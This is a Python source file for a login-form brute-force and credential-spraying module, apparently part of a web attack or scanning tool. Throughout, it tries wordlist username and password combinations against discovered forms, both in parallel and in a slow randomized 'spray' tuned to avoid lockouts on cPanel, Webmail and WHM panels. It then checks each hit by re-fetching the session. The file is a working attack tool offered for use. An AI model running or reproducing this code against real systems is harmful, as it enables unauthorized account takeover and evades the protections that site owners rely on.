import asyncio
import aiohttp
import logging
from modules.console import cprint
import os
import random
import time
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin


class BruteforceModule:
    #: Per-form wall-clock budget so one blackholed host cannot stall a scan.
    FORM_DEADLINE_SECONDS = 120.0
    #: Concurrent login attempts against a single form.
    MAX_PARALLEL_ATTEMPTS = 8
    #: Hard cap on attempts per form regardless of wordlist size.
    MAX_ATTEMPTS_PER_FORM = 300
    #: Single reachability probe before committing the whole budget.
    PROBE_TIMEOUT = 6.0

    #: Slow anti-lockout spray (cPanel/Webmail/WHM lock the IP after a
    #: handful of fast failures — parallel hammering guarantees a ban).
    SPRAY_DELAY_MIN = 4.0
    SPRAY_DELAY_MAX = 9.0
    SPRAY_MAX_ATTEMPTS = 30
    SPRAY_USERNAMES = ['admin', 'root', 'administrator']
    SPRAY_PASSWORDS = ['admin', 'password', 'admin123', 'Password1',
                       'P@ssw0rd', '123456', 'welcome', 'letmein',
                       'qwerty', 'changeme']
    #: Response body/status signals that the panel is now blocking us.
    LOCKOUT_MARKERS = (
        'login blocked', 'has been blocked', 'temporarily blocked',
        'too many failed', 'maximum number of failed', 'account is locked',
        'locked out', 'try again later', 'security delay',
        'rate limit', 'too many attempts', 'failed login attempts',
        'your ip has been', 'blocked due to', 'login is blocked',
    )

    def __init__(self) -> None:
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            },
            connector=aiohttp.TCPConnector(ssl=False),
            # unsafe jar: the session re-check below depends on cookies
            # even when the target is a bare IP (default jar drops those).
            cookie_jar=aiohttp.CookieJar(unsafe=True),
        )
        self.logger = logging.getLogger(__name__)

    async def _form_reachable(self, url: str) -> bool:
        """One cheap probe so a blackholed host costs seconds, not the budget."""
        try:
            async with self.session.get(
                url, ssl=False, allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=self.PROBE_TIMEOUT),
            ) as response:
                await response.read()
                return response.status < 500
        except Exception as exc:
            self.logger.debug('reachability probe failed for %s: %s', url, exc)
            return False

    async def _run_attempts(
        self,
        form_url: str,
        method: str,
        username_field: str,
        password_field: str,
        attempts: List[Tuple[str, str]],
        other_fields: Dict[str, str],
    ) -> Optional[Tuple[str, str]]:
        """Run login attempts concurrently with progress and a hard deadline.

        Returns ``(username, password)`` for the first hit, otherwise
        ``None``.  Prints progress so the operator can see the phase is alive.
        """
        total = min(len(attempts), self.MAX_ATTEMPTS_PER_FORM)
        chunk_size = self.MAX_PARALLEL_ATTEMPTS * 4
        semaphore = asyncio.Semaphore(self.MAX_PARALLEL_ATTEMPTS)
        started = time.monotonic()
        deadline = started + self.FORM_DEADLINE_SECONDS
        index = 0

        while index < total and time.monotonic() < deadline:
            chunk = attempts[index:index + chunk_size]

            async def _one(username: str, password: str) -> Tuple[str, str, bool]:
                async with semaphore:
                    ok = await self._try_login(
                        form_url, method, username_field, password_field,
                        username, password, other_fields)
                    return username, password, ok

            results = await asyncio.gather(
                *(_one(username, password) for username, password in chunk),
                return_exceptions=True)
            index += len(chunk)

            for item in results:
                if isinstance(item, Exception):
                    self.logger.debug('login attempt failed: %s', item)
                    continue
                if item[2]:
                    elapsed = time.monotonic() - started
                    cprint(f"    [+] SUCCESS: {item[0]}:{item[1]} on {form_url} "
                          f"({index}/{total} attempts, {elapsed:.0f}s)")
                    self.logger.warning(
                        'Successful login found: %s:%s on %s',
                        item[0], item[1], form_url)
                    return item[0], item[1]

            elapsed = time.monotonic() - started
            cprint(f"    [*] {form_url}: {index}/{total} attempts "
                  f"({elapsed:.0f}s elapsed)")

        if index < total:
            cprint(f"    [-] {form_url}: {self.FORM_DEADLINE_SECONDS:.0f}s budget "
                  f"exhausted after {index}/{total} attempts, moving on")
            self.logger.info(
                'Bruteforce deadline reached on %s after %d attempts',
                form_url, index)
        return None

    async def bruteforce_login_forms(
        self,
        login_forms: List[Dict[str, Any]],
        custom_username_file: Optional[str] = None,
        custom_password_file: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Bruteforce discovered login forms with custom wordlists support"""
        successful_logins = []

        # Load base wordlists
        usernames = self._load_wordlist(custom_username_file, [
            'admin', 'administrator', 'root', 'user', 'test', 'guest',
            'manager', 'support', 'demo', 'webmaster', 'operator', 'service',
            'sa', 'postgres', 'oracle', 'mysql', 'ftp', 'mail'
        ])

        passwords = self._load_wordlist(custom_password_file, [
            'admin', 'password', '123456', '123456789', 'qwerty', 'abc123',
            'password123', 'admin123', 'root', 'letmein', 'welcome', 'monkey',
            'dragon', 'passw0rd', 'p@ssw0rd', '12345', '12345678', '1234567890',
            'Password1', 'Pass123', 'admin@123', 'root@123', 'pass', '1q2w3e4r',
            'qwerty123', 'superman', 'batman', 'starwars', 'iloveyou'
        ])

        for form in login_forms:
            form_url = form['url']
            method = form['method']
            inputs = form['inputs']

            cprint(f"  [*] Bruteforcing login form: {form_url}")
            self.logger.info(f"Bruteforcing login form: {form_url}")

            # Identify username and password fields
            username_field = None
            password_field = None
            other_fields = {}

            for inp in inputs:
                name = inp['name']
                if not name:
                    continue
                if 'user' in name.lower() or 'email' in name.lower() or 'login' in name.lower():
                    username_field = name
                elif 'pass' in name.lower() or 'pwd' in name.lower():
                    password_field = name
                else:
                    other_fields[name] = 'default'  # or some default value

            if not username_field or not password_field:
                cprint(f"    [-] Could not identify username/password fields for {form_url}")
                continue

            if not await self._form_reachable(form_url):
                cprint(f"    [-] {form_url} unreachable (connect timeout/refused), "
                      f"skipping form")
                self.logger.warning(f"Skipping unreachable login form: {form_url}")
                continue

            # Try combinations
            attempts = [(username, password)
                        for username in usernames for password in passwords]
            hit = await self._run_attempts(
                form_url, method, username_field, password_field,
                attempts, other_fields)
            if hit:
                successful_logins.append({
                    'url': form_url,
                    'username': hit[0],
                    'password': hit[1],
                    'method': method
                })

        return successful_logins

    def _load_wordlist(self, file_path: Optional[str], default_list: List[str]) -> List[str]:
        """Load wordlist from file or return default"""
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    words = [line.strip() for line in f if line.strip()]
                    return words[:1000]  # Limit to prevent excessive attempts
            except Exception as e:
                self.logger.warning(f"Failed to load wordlist {file_path}: {e}")
        return default_list

    async def intelligent_bruteforce(self, login_forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """ML-based password prediction and intelligent bruteforce"""
        successful_logins = []

        # Intelligent password generation based on common patterns
        intelligent_passwords = self._generate_intelligent_passwords()

        for form in login_forms:
            form_url = form['url']
            method = form['method']
            inputs = form['inputs']

            cprint(f"  [*] Intelligent bruteforce on: {form_url}")

            # Identify fields
            username_field, password_field, other_fields = self._identify_fields(inputs)

            if not username_field or not password_field:
                cprint(f"    [-] could not identify username/password fields, skipping")
                continue

            if not await self._form_reachable(form_url):
                cprint(f"    [-] {form_url} unreachable (connect timeout/refused), "
                      f"skipping form")
                self.logger.warning(f"Skipping unreachable login form: {form_url}")
                continue

            # Try intelligent combinations first
            attempts = [
                (username, password)
                for username in ['admin', 'root', 'administrator']
                for password in intelligent_passwords[:50]  # Limit attempts
            ]
            hit = await self._run_attempts(
                form_url, method, username_field, password_field,
                attempts, other_fields)
            if hit:
                successful_logins.append({
                    'url': form_url,
                    'username': hit[0],
                    'password': hit[1],
                    'method': 'intelligent'
                })

        return successful_logins

    def _generate_intelligent_passwords(self) -> List[str]:
        """Generate passwords based on common patterns and mutations"""
        bases = ['admin', 'password', '123456', 'qwerty', 'letmein']
        mutations = [
            lambda x: x,
            lambda x: x + '123',
            lambda x: x + '!',
            lambda x: x + '2024',
            lambda x: x + '2026',
            lambda x: x.capitalize(),
            lambda x: x.upper(),
            lambda x: 'P@ssw0rd' if x == 'password' else x,
        ]

        passwords = set()
        for base in bases:
            for mutation in mutations:
                passwords.add(mutation(base))

        # Add common passwords
        common = ['admin123', 'Admin123', 'Password1', 'Welcome1', 'Monkey123']
        passwords.update(common)

        return list(passwords)

    def _identify_fields(self, inputs: List[Dict[str, str]]) -> tuple:
        """Identify username, password and other fields"""
        username_field: Optional[str] = None
        password_field: Optional[str] = None
        other_fields: Dict[str, str] = {}

        for inp in inputs:
            name = inp['name']
            if not name:
                continue
            if 'user' in name.lower() or 'email' in name.lower() or 'login' in name.lower():
                username_field = name
            elif 'pass' in name.lower() or 'pwd' in name.lower():
                password_field = name
            else:
                other_fields[name] = 'default'

        return username_field, password_field, other_fields

    async def _try_login_detailed(
        self, url: str, method: str, username_field: str, password_field: str,
        username: str, password: str, other_fields: Dict[str, str],
    ) -> Tuple[bool, bool, int]:
        """One attempt that also reports lockout state.

        Returns ``(success, lockout, http_status)``.  Lockout detection runs
        before success detection: a block page that happens to contain
        'admin' must never read as a login.
        """
        data = {username_field: username, password_field: password}
        data.update(other_fields)
        try:
            if method == 'POST':
                async with self.session.post(
                    url, data=data, ssl=False, allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=8)) as response:
                    content = await response.text()
                    status = response.status
                    retry_after = response.headers.get('Retry-After')
            else:
                async with self.session.get(
                    url, params=data, ssl=False, allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=8)) as response:
                    content = await response.text()
                    status = response.status
                    retry_after = response.headers.get('Retry-After')
            content_lower = content.lower()
            if status in (429, 423) or retry_after or any(
                    m in content_lower for m in self.LOCKOUT_MARKERS):
                return False, True, status
            success_indicators = ['dashboard', 'welcome', 'logout', 'profile',
                                  'home', 'success', 'authenticated', 'user account']
            failure_indicators = ['invalid', 'incorrect', 'error', 'failed',
                                  'wrong', 'login', 'unauthorized', 'forbidden',
                                  'denied']
            has_success = any(ind in content_lower for ind in success_indicators)
            has_failure = any(ind in content_lower for ind in failure_indicators)
            ok = ((has_success or (len(content) > 500 and not has_failure))
                  and status == 200)
            return ok, False, status
        except Exception as e:
            self.logger.debug('detailed login attempt failed for %s: %s', url, e)
            return False, False, 0

    async def _verify_session(self, form_url: str) -> bool:
        """Re-fetch the login URL with the post-login cookie jar.

        A heuristic 'success' only counts when the follow-up request shows an
        authenticated page (no password field back, logout/dashboard markers
        present).  Redirected back to the login form = false positive.
        """
        try:
            async with self.session.get(
                form_url, ssl=False, allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status != 200:
                    return False
                content = await response.text()
                lower = content.lower()
                if 'type="password"' in lower or "type='password'" in lower:
                    return False
                return any(m in lower for m in
                           ('logout', 'sign out', 'log out', 'dashboard',
                            'welcome back', 'control panel'))
        except Exception as e:
            self.logger.debug('session verification failed for %s: %s', form_url, e)
            return False

    async def slow_spray(self, login_forms: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Rate-limited credential spray for panel logins (cPanel/Webmail/WHM).

        Deliberately slow: sequential attempts, 4-9s randomized gaps, immediate
        abort on lockout signals, and every heuristic success re-verified with
        a follow-up request so the report never claims a login it cannot prove.

        Returns ``{'credentials': [...], 'lockouts': [...], 'stats': {...}}``.
        """
        out: Dict[str, Any] = {'credentials': [], 'lockouts': [],
                               'stats': {'attempts': 0, 'forms': 0}}
        combos = [(u, p)
                  for u in self.SPRAY_USERNAMES
                  for p in self.SPRAY_PASSWORDS][:self.SPRAY_MAX_ATTEMPTS]

        for form in login_forms:
            form_url = form['url']
            method = form.get('method', 'POST')
            inputs = form.get('inputs') or []
            cprint(f"  [*] Slow spray on: {form_url} "
                  f"({len(combos)} attempts, {self.SPRAY_DELAY_MIN:.0f}-"
                  f"{self.SPRAY_DELAY_MAX:.0f}s gaps, lockout abort)")

            username_field, password_field, other_fields = self._identify_fields(inputs)
            if not username_field or not password_field:
                cprint(f"    [-] could not identify username/password fields, skipping")
                continue
            if not await self._form_reachable(form_url):
                cprint(f"    [-] {form_url} unreachable (connect timeout/refused), skipping")
                continue

            out['stats']['forms'] += 1
            for i, (username, password) in enumerate(combos, 1):
                if i > 1:
                    await asyncio.sleep(
                        random.uniform(self.SPRAY_DELAY_MIN, self.SPRAY_DELAY_MAX))
                ok, lockout, status = await self._try_login_detailed(
                    form_url, method, username_field, password_field,
                    username, password, other_fields)
                out['stats']['attempts'] += 1

                if lockout:
                    detail = (f"lockout/rate-limit signal (HTTP {status}) "
                              f"after {i - 1} attempts")
                    cprint(f"    [!] LOCKOUT on {form_url}: {detail} — aborting "
                          f"this form; wait for the block to lift, then retry manually")
                    self.logger.warning('Spray lockout on %s: %s', form_url, detail)
                    out['lockouts'].append({'url': form_url, 'detail': detail})
                    break

                if ok:
                    if await self._verify_session(form_url):
                        cprint(f"    [+] SUCCESS (session verified): "
                              f"{username}:{password} on {form_url}")
                        out['credentials'].append({
                            'url': form_url, 'username': username,
                            'password': password, 'method': 'slow-spray',
                            'verified': True})
                        break
                    cprint(f"    [*] heuristic success for {username}:{password} "
                          f"failed the session re-check — false positive, continuing")

                cprint(f"    [*] spray {form_url}: {i}/{len(combos)} attempts")

        return out

    async def _try_login(self, url: str, method: str, username_field: str, password_field: str, username: str, password: str, other_fields: Dict[str, str]) -> bool:
        """Try a single login attempt"""
        data = {username_field: username, password_field: password}
        data.update(other_fields)

        try:
            if method == 'POST':
                async with self.session.post(url, data=data, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as response:
                    content = await response.text()
            else:
                params = data
                async with self.session.get(url, params=params, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as response:
                    content = await response.text()

            # Check for success
            success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 'home', 'success', 'authenticated', 'user account']
            failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'login', 'unauthorized', 'forbidden', 'denied']

            content_lower = content.lower()
            has_success = any(ind in content_lower for ind in success_indicators)
            has_failure = any(ind in content_lower for ind in failure_indicators)

            return (has_success or (len(content) > 500 and not has_failure)) and response.status == 200

        except Exception as e:
            self.logger.debug('Error in _try_login for %s: %s', url, e)
            return False

    async def close(self) -> None:
        await self.session.close()